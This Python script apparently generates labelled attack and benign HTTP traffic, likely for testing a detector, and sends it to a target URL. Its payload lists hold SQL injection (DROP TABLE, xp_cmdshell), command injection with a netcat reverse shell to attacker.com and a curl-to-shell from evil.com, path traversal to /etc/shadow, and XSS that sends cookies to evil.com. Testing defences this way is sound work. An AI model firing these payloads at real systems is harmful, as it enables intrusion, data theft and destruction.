from __future__ import annotations

import json
import random

# ── SQL Injection ────────────────────────────────────────────────

SQLI_PAYLOADS = [
    {"user": "' OR '1'='1", "pass": "' OR '1'='1"},
    {"user": "admin' --", "pass": "anything"},
    {"user": "admin'/*", "pass": "*/ OR '1'='1"},
    {"user": "' UNION SELECT * FROM users --", "pass": "x"},
    {"user": "'; DROP TABLE users; --", "pass": "x"},
    {"user": "' OR 1=1 --", "pass": "x"},
    {"user": "admin\" OR \"1\"=\"1", "pass": "x"},
    {"user": "\\'; EXEC xp_cmdshell('whoami') --", "pass": "x"},
]

# ── Command Injection / RCE ─────────────────────────────────────

RCE_PAYLOADS = [
    "127.0.0.1; whoami",
    "127.0.0.1 | id",
    "127.0.0.1 && cat /etc/passwd",
    "127.0.0.1`uname -a`",
    "$(whoami).example.com",
    "127.0.0.1 | nc -e /bin/sh attacker.com 4444",
    "127.0.0.1; curl http://evil.com/payload.sh | sh",
    "127.0.0.1 & ping -c 1000 127.0.0.1 &",
]

# ── Path Traversal ──────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../../../etc/passwd",
]

# ── XSS ─────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "\"><script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
]

# ── Benign Traffic ──────────────────────────────────────────────

BENIGN_USERS = ["alice", "bob", "charlie", "dave", "eve"]
BENIGN_PASSWORDS = ["password123", "welcome1", "letmein", "qwerty123", "admin123"]
BENIGN_SEARCHES = ["hello world", "python tutorial", "how to code", "news today"]
BENIGN_HOSTS = ["google.com", "cloudflare.com", "github.com", "localhost"]


def sql_injection_attacks() -> list[dict]:
    return [
        {"type": "sql_injection", "method": "POST", "path": "/login", "body": json.dumps(p)}
        for p in SQLI_PAYLOADS
    ]


def rce_attacks() -> list[dict]:
    return [
        {"type": "rce", "method": "GET", "path": "/ping", "query": f"host={p}"}
        for p in RCE_PAYLOADS
    ]


def path_traversal_attacks() -> list[dict]:
    return [
        {"type": "path_traversal", "method": "GET", "path": "/file", "query": f"name={p}"}
        for p in PATH_TRAVERSAL_PAYLOADS
    ]


def xss_attacks() -> list[dict]:
    return [
        {"type": "xss", "method": "GET", "path": "/search", "query": f"q={p}"}
        for p in XSS_PAYLOADS
    ]


def benign_requests(n: int = 10) -> list[dict]:
    requests: list[dict] = []
    for i in range(n):
        choice = random.choice(["login", "search", "ping", "home"])
        if choice == "login":
            requests.append({
                "type": "benign_login",
                "method": "POST",
                "path": "/login",
                "body": json.dumps({
                    "user": random.choice(BENIGN_USERS),
                    "pass": random.choice(BENIGN_PASSWORDS),
                }),
            })
        elif choice == "search":
            requests.append({
                "type": "benign_search",
                "method": "GET",
                "path": "/search",
                "query": f"q={random.choice(BENIGN_SEARCHES)}",
            })
        elif choice == "ping":
            requests.append({
                "type": "benign_ping",
                "method": "GET",
                "path": "/ping",
                "query": f"host={random.choice(BENIGN_HOSTS)}",
            })
        else:
            requests.append({
                "type": "benign_home",
                "method": "GET",
                "path": "/",
                "query": "",
            })
    return requests


def all_attacks() -> list[dict]:
    attacks: list[dict] = []
    attacks.extend(sql_injection_attacks())
    attacks.extend(rce_attacks())
    attacks.extend(path_traversal_attacks())
    attacks.extend(xss_attacks())
    return attacks


def all_benign() -> list[dict]:
    return benign_requests(15)


def send_sync(url: str, req: dict) -> str:
    import urllib.request
    import urllib.parse

    full = f"{url}{req['path']}"
    if req.get("query"):
        q = req["query"]
        if "=" in q:
            k, v = q.split("=", 1)
            full = f"{full}?{k}={urllib.parse.quote(v, safe='')}"
        else:
            full = f"{full}?{urllib.parse.quote(q, safe='')}"
    data = req["body"].encode() if req.get("body") else None
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(full, data=data, headers={"User-Agent": "LymphaAttack/1.0"}),
            timeout=5,
        )
        return r.read().decode()[:80]
    except Exception as e:
        return f"ERR: {e}"


def main() -> None:
    import sys
    import time

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
    print(f"Attacking {target}")

    types = {
        "sqli": sql_injection_attacks,
        "rce": rce_attacks,
        "path": path_traversal_attacks,
        "xss": xss_attacks,
    }

    if len(sys.argv) > 2:
        selected = sys.argv[2].split(",")
    else:
        selected = list(types.keys())

    print(f"Payload types: {', '.join(selected)}")
    print()

    for t in selected:
        if t not in types:
            print(f"  Unknown type '{t}', skipping")
            continue
        payloads = types[t]()
        print(f"  [{t}] sending {len(payloads)} payloads...")
        for p in payloads:
            resp = send_sync(target, p)
            print(f"    {p['method']} {p['path']} -> {resp}")
            time.sleep(0.1)

    print("\n  Sending benign traffic...")
    for b in benign_requests(5):
        resp = send_sync(target, b)
        print(f"    {b['method']} {b['path']} -> {resp}")
        time.sleep(0.05)

    print("\n  Done.")


if __name__ == "__main__":
    main()
